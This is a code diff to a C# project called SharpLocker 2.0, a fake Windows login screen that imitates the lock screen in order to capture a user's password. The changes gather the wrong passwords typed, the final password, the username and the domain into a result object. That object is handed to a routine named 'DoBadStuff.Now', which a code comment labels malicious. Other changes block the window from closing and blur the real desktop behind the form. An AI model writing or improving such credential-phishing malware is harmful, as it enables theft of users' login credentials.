@@ -1,6 +1,7 @@
 ﻿using SharpLocker_2._0.Classes;
 using SharpLocker_2._0.Controls;
 using SharpLocker_2._0.Interfaces;
+using SharpLocker_2._0.Models;
 using System;
 using System.Collections.Generic;
 using System.Data;
@@ -24,7 +25,7 @@ namespace SharpLocker_2._0
 
         private int PasswordErrors { get; set; }
         private int PasswordErrorCounter { get; set; }
-        private List<string> ErrorPasswords { get; set; } = new List<string>();
+        private Result Result { get; set; } = new Result();
 
         #endregion
 
@@ -42,6 +43,7 @@ namespace SharpLocker_2._0
             if (!Configuration.DebugMode) e.Cancel = DenyClose;
         }
 
+        // Dont't know what this does
         protected override CreateParams CreateParams
         {
             get
@@ -65,7 +67,7 @@ namespace SharpLocker_2._0
             if (PasswordErrorCounter < PasswordErrors)
             {
                 PasswordErrorCounter++;
-                ErrorPasswords.Add(PasswordTextBox.Text);
+                Result.WrongPasswords.Add(PasswordTextBox.Text);
                 ShowPasswordError();
                 return;
             }
@@ -76,8 +78,13 @@ namespace SharpLocker_2._0
 
             try
             {
+                Result.UserName = Environment.UserName;
+                Result.DisplayName = UserNameLabel.Text;
+                Result.DomainName = Environment.UserDomainName;
+                Result.Password = PasswordTextBox.Text;
+
                 // Time for malicious business 😏
-                DoBadStuff.Now(PasswordTextBox.Text, Environment.UserName, Environment.UserDomainName, ErrorPasswords);
+                DoBadStuff.Now(Result);
             }
             catch (Exception ex)
             {
@@ -219,7 +226,7 @@ namespace SharpLocker_2._0
                 ISetup setup = InterfaceLoader.Get<ISetup>();
                 if (setup is null) return;
 
-                Configuration = setup.Initialize(Configuration);
+                setup.Initialize(Configuration);
             }
             catch (Exception ex)
             {
@@ -297,11 +304,11 @@ namespace SharpLocker_2._0
         private void BlurBackground()
         {
             GaussianBlur blur = new GaussianBlur(GetBackgroundImage());
-            BackgroundImage = blur.Process(10);
+            BackgroundImage = blur.Process(Configuration.BlurIntensity);
 
             if (BackgroundImage.IsPixelBright(11, 387) || //Bottom left
                 BackgroundImage.IsPixelBright(EaseOfAccessButton.Location.X, EaseOfAccessButton.Location.Y) ||
-                BackgroundImage.IsPixelBright(UserNameLabel.Location.X, UserNameLabel.Location.Y)) BackgroundImage.AdjustBrightness(-80);
+                BackgroundImage.IsPixelBright(UserNameLabel.Location.X, UserNameLabel.Location.Y)) BackgroundImage.AdjustBrightness(Configuration.DarknessIntensity);
         }
 
         // Load the current users profile picture into the form
@@ -393,7 +400,7 @@ namespace SharpLocker_2._0
         private void WindowsLogin_Paint(object sender, PaintEventArgs e)
         {
             if (!PasswordTextBox.Visible) return;
-           
+
             int offset = 1;
             e.Graphics.DrawRectangle(new Pen(LoginButton.FlatAppearance.BorderColor), new Rectangle(
                 PasswordTextBox.Location.X - offset,
@@ -407,6 +414,21 @@ namespace SharpLocker_2._0
         {
             AddChangeUserPanel("Other User", 0);
             AddChangeUserPanel(UserNameLabel.Text, 1);
+
+            int counter = 0;
+            // add emergency exit to user button
+            ((Button)Controls.Find("1", true).First()).Click += (s, e) =>
+            {
+                counter++;
+
+                if(counter > 50)
+                {
+                    DenyClose = false;
+                    if (!Configuration.DebugMode) KeyPressHandler.Enable();
+                    Close();
+                }
+
+            };
         }
 
         // create a "other user" control with given properties, then place it on screen
@@ -482,7 +504,8 @@ namespace SharpLocker_2._0
                 ForeColor = Color.White,
                 Text = user,
                 TextAlign = ContentAlignment.MiddleLeft,
-                TabStop = false
+                TabStop = false,
+                Name = panelCount.ToString()
             };
 
             b.MouseEnter += (s, e) =>
